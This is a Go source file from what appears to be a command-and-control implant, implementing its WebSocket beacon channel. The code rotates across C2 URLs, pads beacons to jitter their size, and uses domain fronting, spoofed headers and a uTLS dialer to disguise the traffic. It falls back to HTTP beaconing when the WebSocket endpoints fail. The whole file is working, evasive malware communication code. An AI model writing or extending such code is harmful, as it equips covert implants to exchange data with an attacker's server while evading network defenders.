//go:build linux || windows || darwin
// +build linux windows darwin

package main

import (
	"fmt"
	"net/http"
	"net/url"
	"strings"
	"sync"
	"time"

	"github.com/gorilla/websocket"
)

var (
	wssMu      sync.Mutex
	wssConn    *websocket.Conn
	wssConnURL string
	// wssRoundTripMu serializes full round-trips (dial + write + read) so
	// concurrent callers cannot interleave frames on the shared connection.
	wssRoundTripMu sync.Mutex
)

func sendWSSBeacon(body []byte) []byte {
	startIdx := int(currentC2Idx.Load())
	urls := c2URLsSnapshot()
	body = padBeaconBody(body)
	for i := 0; i < len(urls); i++ {
		idx := (startIdx + i) % len(urls)
		c2URL := urls[idx]
		beaconURI := beaconWSURI()
		wsURL, err := buildWSURL(c2URL, beaconURI)
		if err != nil {
			if Debug {
				fmt.Printf("[!] WS URL build failed for %s: %v\n", c2URL, err)
			}
			continue
		}
		resp, err := wssRoundTrip(wsURL, body)
		if err != nil {
			if Debug {
				fmt.Printf("[!] WS beacon to %s failed: %v\n", wsURL, err)
			}
			continue
		}
		currentC2Idx.Store(int32(idx))
		if Debug {
			fmt.Printf("[+] WS Beacon OK from %s, response %d bytes\n", wsURL, len(resp))
		}
		return resp
	}

	fmt.Printf("[c2] WARN: all WebSocket endpoints failed, falling back to HTTP beacon (%d URL(s))\n", len(urls))
	return sendBeacon(body)
}

func wssRoundTrip(wsURL string, body []byte) ([]byte, error) {
	wssRoundTripMu.Lock()
	defer wssRoundTripMu.Unlock()
	conn, err := wssDial(wsURL)
	if err != nil {
		return nil, err
	}
	conn.SetWriteDeadline(time.Now().Add(15 * time.Second))
	// Binary frames: body-length jitter can append non-UTF-8 bytes.
	if err := conn.WriteMessage(websocket.BinaryMessage, body); err != nil {
		wssInvalidate()
		return nil, err
	}
	conn.SetReadDeadline(time.Now().Add(30 * time.Second))
	_, resp, err := conn.ReadMessage()
	if err != nil {
		wssInvalidate()
		return nil, err
	}
	return resp, nil
}

func wssDial(wsURL string) (*websocket.Conn, error) {
	wssMu.Lock()
	defer wssMu.Unlock()
	if wssConn != nil && wssConnURL == wsURL {
		if err := wssConn.WriteControl(websocket.PingMessage, nil, time.Now().Add(3*time.Second)); err == nil {
			return wssConn, nil
		}
		_ = wssConn.Close()
		wssConn = nil
	} else if wssConn != nil {
		// C2 rotation: the cached connection points at a different endpoint.
		// Close it BEFORE overwriting, otherwise the old socket (and gorilla's
		// internal goroutines) leak one connection per rotation.
		_ = wssConn.Close()
		wssConn = nil
	}

	header := http.Header{}
	if DomainFront != "" {
		header.Set("Host", DomainFront)
	}
	header.Set("User-Agent", getActiveUserAgentFromConfig())
	for k, v := range getActiveHeaders() {
		if strings.EqualFold(k, "User-Agent") {
			continue
		}
		header.Set(k, v)
	}
	dialer := &websocket.Dialer{
		HandshakeTimeout: 10 * time.Second,
		NetDialContext:   utlsDialContext,
	}
	conn, _, err := dialer.Dial(wsURL, header)
	if err != nil {
		return nil, err
	}
	conn.SetPongHandler(func(string) error {
		_ = conn.SetReadDeadline(time.Now().Add(90 * time.Second))
		return nil
	})
	wssConn = conn
	wssConnURL = wsURL
	return conn, nil
}

func wssInvalidate() {
	wssMu.Lock()
	defer wssMu.Unlock()
	if wssConn != nil {
		_ = wssConn.Close()
		wssConn = nil
	}
}

func buildWSURL(c2URL, path string) (string, error) {
	u, err := url.Parse(c2URL)
	if err != nil {
		return "", err
	}
	scheme := "ws"
	if u.Scheme == "https" || u.Scheme == "wss" {
		scheme = "wss"
	}
	host := u.Host
	if host == "" {
		host = u.Path
	}
	return fmt.Sprintf("%s://%s%s", scheme, host, path), nil
}
